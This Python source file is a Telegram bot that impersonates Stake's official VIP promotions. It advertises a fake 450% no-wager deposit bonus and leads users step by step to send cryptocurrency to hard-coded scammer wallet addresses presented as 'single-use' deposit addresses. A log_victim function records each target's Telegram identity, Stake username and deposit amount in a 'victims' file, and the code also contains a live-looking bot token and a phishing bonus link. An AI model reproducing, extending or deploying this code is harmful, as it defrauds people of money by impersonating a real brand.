from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import requests
import random
from datetime import datetime

BOT_TOKEN = "8714329334:AAFepxWOh0AHd1v2kav3Csp-cZQAOSoEJCY"

WALLET_ADDRESSES = {
    "BTC": "bc1qrw5nna0kc5jhr20z7pjcgpr5qtv58m2w4mqr5r",
    "ETH": "0xfAC5629ED6fb9809a48Fd4afb6f599E6DEB7d4F8",
    "SOL": "3dkZeGHTe3GLjwr615LbymQaKPBJJEsAmWFTJXEVcXb9",
    "DOGE": "D7PihTHoFrBQ7y315k6jpq9bRjtpRqnUrF",
    "LTC": "LbfHG7cd39ana9wqzCUXR5EqjuHYr7XHYr",
    "USDT": "0xfAC5629ED6fb9809a48Fd4afb6f599E6DEB7d4F8",
    "BNB": "0xfAC5629ED6fb9809a48Fd4afb6f599E6DEB7d4F8",
    "XRP": "rDsbeomae4FXwgQTJp9Rs64Qg9vDiTCdBv",
    "TRX": "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS",
    "SUI": "0xfAC5629ED6fb9809a48Fd4afb6f599E6DEB7d4F8"
}

# User states
AWAITING_PLATFORM = "awaiting_platform"
AWAITING_USERNAME = "awaiting_username"
AWAITING_AMOUNT = "awaiting_amount"
AWAITING_CRYPTO = "awaiting_crypto"
AWAITING_PROCEED = "awaiting_proceed"
AWAITING_TERMS = "awaiting_terms"

def get_main_menu_keyboard():
    """Persistent menu buttons"""
    keyboard = [
        ["🪙 Claim Deposit Offer 🪙"],
        ["🔍 Channel Directory 🔍"],
        ["🎟️ Enter Raffle 🎟️"],
        ["🏢 Contact US 🏢"],
        ["🔔 Weekly Bonus🔔"],
        ["🔔 March Monthly Bonus🔔"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_crypto_price(crypto):
    """Fetch real-time price"""
    coin_ids = {
        "BTC": "bitcoin", "ETH": "ethereum", "SOL": "solana",
        "DOGE": "dogecoin", "LTC": "litecoin", "USDT": "tether",
        "BNB": "binancecoin", "XRP": "ripple", "TRX": "tron", "SUI": "sui"
    }
    try:
        coin_id = coin_ids.get(crypto)
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
        response = requests.get(url, timeout=5)
        data = response.json()
        price = data[coin_id]['usd']
        return f"{price:,.2f}"
    except:
        return "Loading..."

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with logo"""
    user = update.effective_user
    context.user_data.clear()
    
    # Send Stake logo (you'll need to host this image or use a URL)
    logo_url = "https://i.imgur.com/YourStakeLogo.png"  # Replace with actual hosted logo
    
    welcome_text = """What can this bot do?
Stake VIP Bot

Welcome to the official Stake VIP Telegram Bot. Here, you'll receive exclusive updates on all upcoming VIP promotions, including:

- Deposit bonuses
- Weekly bonuses
- Monthly bonuses
- Special events & limited-time promotions

Stay tuned and never miss a reward!"""
    
    # Try to send with photo, fallback to text if photo fails
    try:
        await update.message.reply_photo(
            photo=logo_url,
            caption=welcome_text
        )
    except:
        await update.message.reply_text(welcome_text)
    
    await update.message.reply_text(
        "Welcome to the official main Bot for Stake Promotions. Check here for exclusive offers, bonuses, and announcements! /bonus\n\nUse /off to pause your subscription.",
        reply_markup=get_main_menu_keyboard()
    )
    
    await update.message.reply_text(
        "Want to create your own bot?\nGo to @Manybot"
    )

async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle menu button presses"""
    text = update.message.text
    
    if "Claim Deposit Offer" in text:
        await show_bonus_offer(update, context)
    elif "Channel Directory" in text:
        await show_channel_directory(update, context)
    elif "Enter Raffle" in text:
        await update.message.reply_text("No Raffle available now")
    elif "Contact US" in text:
        await update.message.reply_text("For support, send a message @StakeOficalSupport")
    elif "Weekly Bonus" in text:
        await show_weekly_bonus(update, context)
    elif "March Monthly Bonus" in text:
        await show_monthly_bonus(update, context)

async def show_bonus_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the 450% deposit bonus offer"""
    offer_text = """EXCLUSIVE Bonus Deposit! 💰

It's officially the month of good! Here's another offer boost to show how much we love our amazing players!
Note: both new AND existing users may claim these offers

💎 450% match up to $400,000
🚫 No Wager Requirements
📅 Expires March 12st at 11:59PM UTC

You read that right, NO wager requirements! Players may withdraw the full amount immediately (if they wish!)

🚀 Users who claim and deposit $10,000 or more will receive the benefit of an exclusive VIP Host and personalized bonuses for 7 calendar days!
If you already have a VIP Host, you'll receive an additional 50% deposit match instead."""
    
    await update.message.reply_text(offer_text)
    await update.message.reply_text('Click "Claim Deposit Offer" for more details')
    
    # Set state to start the claim flow
    context.user_data['state'] = AWAITING_PLATFORM

async def show_channel_directory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show Stake channel links"""
    directory_text = """Stake Telegram Channel Directory

🌍 Stake.com - Play Smarter
▶️ @StakeCasino

🇺🇸 Stake.us - Play Smarter
▶️ @StakeSocial"""
    
    await update.message.reply_text(directory_text)

async def show_weekly_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show weekly bonus info"""
    weekly_text = """Weekly Bonus

💸 VIP Weekly Bonus: Here
💰 Total VIP Weekly Bonus: $15,854,373!

https://playstake.info/bonus?code=BoostWeekly21226

Please note that the weekly boost includes all activity from midnight GMT on the 14th of February to midnight GMT on the 21st of February and is only available to people who have played in the last 1 week

$75,000 Weekly Giveaway

⏰ When: 2:00 PM GMT (After the sprint race)
📺 Where: https://kick.com/Eddie

$25,000 Sprint Race

🏁 Starts: 12:30pm GMT
⏰ Duration: 90 minutes
💰 Prize: $25,000 for the top 100"""
    
    await update.message.reply_text(weekly_text)

async def show_monthly_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show monthly bonus info"""
    # Same as weekly for now
    await show_weekly_bonus(update, context)

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user text inputs based on state"""
    state = context.user_data.get('state')
    text = update.message.text
    
    # Check if it's a menu button
    if any(btn in text for btn in ["Claim Deposit Offer", "Channel Directory", "Enter Raffle", "Contact US", "Weekly Bonus", "Monthly Bonus"]):
        await handle_menu(update, context)
        return
    
    if state == AWAITING_PLATFORM:
        # Ask which platform
        platform_text = "Will your deposit be for an account on Stake.com or Stake.us? (Select below)\n\nPlease select an item from the menu below."
        
        keyboard = [
            ["Stake.com"],
            ["Stake.us"],
            ["Cancel"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(platform_text, reply_markup=reply_markup)
        context.user_data['state'] = AWAITING_USERNAME
        
    elif state == AWAITING_USERNAME:
        if text == "Cancel":
            await update.message.reply_text("Cancelled.", reply_markup=get_main_menu_keyboard())
            context.user_data.clear()
            return
            
        if text in ["Stake.com", "Stake.us"]:
            context.user_data['platform'] = text
            await update.message.reply_text(
                "What is your Stake username (type below)",
                reply_markup=ReplyKeyboardRemove()
            )
            context.user_data['state'] = AWAITING_AMOUNT
        else:
            # They typed the username
            context.user_data['username'] = text
            await update.message.reply_text(
                "How much (in USD) would you like to deposit? (Type your answer below)\n\nPlease respond with numbers only, no symbols please.\nFor example: 500"
            )
            context.user_data['state'] = AWAITING_CRYPTO
            
    elif state == AWAITING_AMOUNT:
        context.user_data['username'] = text
        await update.message.reply_text(
            "How much (in USD) would you like to deposit? (Type your answer below)\n\nPlease respond with numbers only, no symbols please.\nFor example: 500"
        )
        context.user_data['state'] = AWAITING_CRYPTO
        
    elif state == AWAITING_CRYPTO:
        try:
            amount = int(text)
            context.user_data['amount'] = amount
            
            crypto_text = "Which Crypto Currency will you be depositing with? (Please select from the list)"
            
            keyboard = [
                ["BTC"], ["ETH"], ["LTC"], ["USDT"],
                ["SOL"], ["BNB"], ["DOGE"], ["XRP"],
                ["TRX"], ["SUI"], ["Cancel"]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
            
            await update.message.reply_text(crypto_text, reply_markup=reply_markup)
            context.user_data['state'] = AWAITING_PROCEED
        except:
            await update.message.reply_text("Please enter numbers only. For example: 500")
            
    elif state == AWAITING_PROCEED:
        if text == "Cancel":
            await update.message.reply_text("Cancelled.", reply_markup=get_main_menu_keyboard())
            context.user_data.clear()
            return
            
        crypto = text
        context.user_data['crypto'] = crypto
        
        proceed_text = f"""Thank you, I will now retrieve a single-use address associated with the Stake username you provided, to facilitate our deposit match with no wager requirements.

- Your deposit will appear in your Transactions page after 1 confirmation is reached.
- Please note, any future deposits made to this address will be credited to your account, but will not receive a deposit match.
- After clicking the "Proceed" button below, you will be given the option to "Agree to Terms." By agreeing to terms, you confirm that you've read and understood this message.

‼️ Please ensure that the username you provided is correct. If not, please click "cancel" and restart the process"""
        
        keyboard = [["Proceed"], ["Cancel"]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(proceed_text, reply_markup=reply_markup)
        context.user_data['state'] = AWAITING_TERMS
        
    elif state == AWAITING_TERMS:
        if text == "Cancel":
            await update.message.reply_text("Cancelled.", reply_markup=get_main_menu_keyboard())
            context.user_data.clear()
            return
        elif text == "Proceed":
            await update.message.reply_text('‼️ You must click "Agree to Terms" to continue')
            
            keyboard = [["Agree to Terms"], ["Cancel"]]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
            
            await update.message.reply_text("Please confirm:", reply_markup=reply_markup)
        elif text == "Agree to Terms":
            await show_final_wallet(update, context)

async def show_final_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the final wallet address"""
    crypto = context.user_data.get('crypto', 'BTC')
    username = context.user_data.get('username', 'Unknown')
    amount = context.user_data.get('amount', 0)
    wallet = WALLET_ADDRESSES.get(crypto, WALLET_ADDRESSES['BTC'])
    
    # Log victim
    user = update.effective_user
    log_victim(user.id, user.username, user.first_name, username, amount, crypto)
    
    await update.message.reply_text("Done!")
    await update.message.reply_text("Made with @Manybot")
    
    wallet_text = f"""Your single-use ({crypto}) address is below.

‼️ After you have sent your deposit, please click the following command:

/Complete

`{wallet}`"""
    
    # Show crypto selection keyboard again
    keyboard = [
        ["BTC"], ["ETH"], ["LTC"], ["USDT"],
        ["SOL"], ["BNB"], ["DOGE"], ["XRP"],
        ["TRX"], ["SUI"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(wallet_text, parse_mode='Markdown', reply_markup=reply_markup)
    
    # Reset state but keep data
    context.user_data['state'] = None

async def complete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /Complete command"""
    crypto = context.user_data.get('crypto', 'BTC')
    wallet = WALLET_ADDRESSES.get(crypto, WALLET_ADDRESSES['BTC'])
    
    complete_text = f"""After you click this button, your offer claim will be complete and your account will be credited after (1) confirmation is reached. ✅

🔍 Channel Directory 🔍"""
    
    await update.message.reply_text(complete_text)
    await show_channel_directory(update, context)
    
    # Reset to main menu
    await update.message.reply_text(
        "Thank you! Your deposit is being processed.",
        reply_markup=get_main_menu_keyboard()
    )
    context.user_data.clear()

def log_victim(user_id, telegram_username, first_name, stake_username, amount, crypto):
    """Log victim data"""
    log_entry = f"""
===== NEW VICTIM =====
Telegram: {first_name} (@{telegram_username}) | ID: {user_id}
Stake Username: {stake_username}
Amount: ${amount} USD
Crypto: {crypto}
Time: {datetime.now()}
======================
"""
    with open('victims.txt', 'a') as f:
        f.write(log_entry)
    print(log_entry)

def main():
    """Run bot"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("Complete", complete_command))
    application.add_handler(CommandHandler("complete", complete_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    
    print("🤖 Stake VIP Bot running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
